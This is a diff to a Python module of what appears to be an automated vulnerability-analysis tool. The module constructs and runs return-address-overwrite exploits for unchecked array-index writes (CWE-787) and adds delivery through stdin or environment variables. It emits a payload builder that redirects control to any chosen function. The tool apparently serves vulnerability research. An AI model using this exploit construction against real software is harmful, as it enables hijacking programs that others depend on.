@@ -47,10 +47,12 @@ _ENCODINGS = [
 ]
 
 
-def _hijack(detonate, exe, buf_off, stride, win_addr):
-    """Find the (index, payload, encoding) that overwrites the saved return address with &win,
-    confirmed by detonation + a negative control. buf_off is the buffer's rbp-relative offset
-    (negative); the return slot sits a few words above rbp. Returns a dict or None."""
+def _hijack(detonate, exe, buf_off, stride, win_addr, specs, scratch_dir):
+    """Find the (channel, index, payload, encoding) that overwrites the saved return address with
+    &win, confirmed by detonation + a negative control. `specs` is the ranked (mode, env_name) list
+    of input channels to deliver on -- the raw index/value bytes are not always read from stdin.
+    buf_off is the buffer's rbp-relative offset (negative); the return slot sits a few words above
+    rbp. Returns a dict or None."""
     stride = stride if stride in (1, 2, 4, 8) else 8
     # candidate target offsets above rbp: the return address (+8/+16 with alignment) and saved rbp.
     centres = set()
@@ -63,24 +65,31 @@ def _hijack(detonate, exe, buf_off, stride, win_addr):
         for d in (0, 1, -1, 2, -2, 3):
             if c + d not in cands and c + d > 0:
                 cands.append(c + d)
-    attempts = 0
-    for idx in cands:
-        for ename, enc in _ENCODINGS:
-            if attempts >= 80:
-                return None
-            attempts += 1
-            payload = enc(idx, win_addr)
-            if not detonate.reaches_address(exe, payload, win_addr, input_mode="stdin"):
-                continue
-            neg = enc(idx, win_addr ^ 0xFFFF)
-            if detonate.reaches_address(exe, neg, win_addr, input_mode="stdin"):
-                continue                                   # reached without our value -> incidental
-            return {"idx": idx, "payload": payload, "enc": ename, "stride": stride}
+    for mode, env_name in specs:
+        attempts = 0
+        for idx in cands:
+            for ename, enc in _ENCODINGS:
+                if attempts >= 80:
+                    break
+                attempts += 1
+                payload = enc(idx, win_addr)
+                if not detonate.reaches_address(exe, payload, win_addr, input_mode=mode,
+                                                env_name=env_name, scratch_dir=scratch_dir):
+                    continue
+                neg = enc(idx, win_addr ^ 0xFFFF)
+                if detonate.reaches_address(exe, neg, win_addr, input_mode=mode,
+                                            env_name=env_name, scratch_dir=scratch_dir):
+                    continue                               # reached without our value -> incidental
+                return {"idx": idx, "payload": payload, "enc": ename, "stride": stride,
+                        "mode": mode, "env_name": env_name}
     return None
 
 
-def _oob_builder(binname, idx, win_addr, win_name, enc) -> list:
+def _oob_builder(binname, idx, win_addr, win_name, enc, mode="stdin", env_name=None) -> list:
     """The retarget knobs + an editable builder for the oob-index-write, as evidence channels."""
+    from . import channels
+    deliver = channels.deliver_line(mode, binname, env_name)
+    where = channels.channel_phrase(mode, env_name)
     order = "struct.pack('<qq', WRITE_INDEX, WRITE_VALUE)" if enc == "idx,val" \
         else "struct.pack('<qq', WRITE_VALUE, WRITE_INDEX)"
     usage = (
@@ -89,7 +98,7 @@ def _oob_builder(binname, idx, win_addr, win_name, enc) -> list:
         "WORKFLOW —\n"
         "1. Download the builder (`poc.py`) below.\n"
         "2. Build the payload: `python3 poc.py > poc.bin`.\n"
-        f"3. Deliver it: `./{binname} < poc.bin` — control transfers to the chosen address.\n"
+        f"3. Deliver it (via {where}): `{deliver}` — control transfers to the chosen address.\n"
         f"ON SOURCE — build the source first (e.g. `gcc -o {binname} src.c`), then run the builder on "
         "the compiled binary. The Memory layout shows the array vs the return address."
     )
@@ -109,7 +118,7 @@ def _oob_builder(binname, idx, win_addr, win_name, enc) -> list:
         f"WRITE_INDEX = {idx}          # arr[WRITE_INDEX] lands on the saved return address\n"
         f"WRITE_VALUE = {win_addr:#x}   # where control jumps -- set to ANY function's address\n\n"
         f"sys.stdout.buffer.write({order})\n"
-        f"# run:  python3 poc.py > poc.bin ;  ./{binname} < poc.bin\n"
+        f"# run:  python3 poc.py > poc.bin ;  {deliver}\n"
     )
     return [{"channel": "builder-usage", "detail": usage},
             {"channel": "customize", "detail": guide},
@@ -120,7 +129,7 @@ def construct_stack_oob_writes(ctx, target) -> list:
     """For each CWE-787/129 unchecked-index write whose function has a stack array, construct and
     DETONATE a return-address overwrite to win -> a poc-backed L3. Returns the filed finding ids."""
     from ...db.dao import FindingDAO, FunctionDAO
-    from . import construct, detonate, elfstatic, exploit
+    from . import channels, construct, detonate, elfstatic, exploit
     fids = []
     try:
         tb = ctx.content.path(target.sha256).read_bytes()
@@ -144,6 +153,8 @@ def construct_stack_oob_writes(ctx, target) -> list:
         ctx.content.stage_target(target, staged.parent, staged.name)
         staged.chmod(0o755)
         exe = str(staged)
+        scratch_dir = str(staged.parent)
+        specs = channels.delivery_specs(ctx, target)
         fnd = FunctionDAO(ctx.conn)
         done_fn = set()
         for lead in leads:
@@ -155,14 +166,18 @@ def construct_stack_oob_writes(ctx, target) -> list:
             bv = _buffer_var(frame)
             buf_off = int(bv["offset"]) if bv and bv.get("offset") is not None else None
             stride = _stride(bv.get("type")) if bv else 8
-            res = _hijack(detonate, exe, buf_off, stride, win_addr)
+            res = _hijack(detonate, exe, buf_off, stride, win_addr, specs, scratch_dir)
             if not res:
                 continue
             idx, payload = res["idx"], res["payload"]
+            mode, env_name = res["mode"], res["env_name"]
             binname = getattr(target, "filename", None) or "./target"
+            where = channels.channel_phrase(mode, env_name)
+            deliver = channels.deliver_line(mode, binname, env_name)
             soundness = [
                 "unchecked array index: arr[idx] = value writes outside the array with no bound "
                 "check on idx (the CWE-787/129 site)",
+                f"the index and value are read from {where}",
                 f"index {idx} overwrites the saved return address: arr_base + {idx}*{res['stride']} "
                 "lands on the return slot -- a constant stack-relative offset, ASLR-independent",
                 f"value = &{win_name} ({win_addr:#x}) -- control redirects to {win_name} on return",
@@ -173,21 +188,23 @@ def construct_stack_oob_writes(ctx, target) -> list:
             reproduce = (
                 f"# CWE-787 out-of-bounds write -> control hijack ({win_name})\n"
                 f"# arr[{idx}] = &{win_name} ({win_addr:#x}) overwrites the saved return address.\n"
-                f"# payload = raw bytes ({len(payload)}); the attached poc-input artifact. save as poc.bin\n"
-                f"{binname} < poc.bin"
+                f"# payload = raw bytes ({len(payload)}) read from {where}; the attached poc-input "
+                "artifact. save as poc.bin\n"
+                f"{deliver}"
             )
             fid = construct.record_constructed_poc(
                 ctx, target, cwe="CWE-787",
                 technique="oob-index-write -> return-address overwrite", level="L3",
-                payload=payload, soundness=soundness, reproduce=reproduce, input_mode="stdin",
+                payload=payload, soundness=soundness, reproduce=reproduce, input_mode=mode,
                 detector="oob_construct", dedup_key=f"poc:CWE-787:oob-write:{fa}:{target.id}",
                 title=f"Out-of-bounds write -> control hijack ({win_name}) at {fa}",
-                summary=f"arr[{idx}] := &{win_name} ({win_addr:#x}) over the saved return address; "
-                        "control reach confirmed by detonation",
+                summary=f"arr[{idx}] := &{win_name} ({win_addr:#x}) over the saved return address "
+                        f"(index/value via {where}); control reach confirmed by detonation",
                 lead=lead, detonated=True,
                 signal_name=f"control reached {win_name} ({win_addr:#x})",
                 function_addr=fa, site_addr=lead.site_addr,
-                extra_evidence=_oob_builder(binname, idx, win_addr, win_name, res["enc"]))
+                extra_evidence=_oob_builder(binname, idx, win_addr, win_name, res["enc"],
+                                            mode, env_name))
             if fid:
                 fids.append(fid)
     except Exception:                                      # noqa: BLE001 -- best-effort
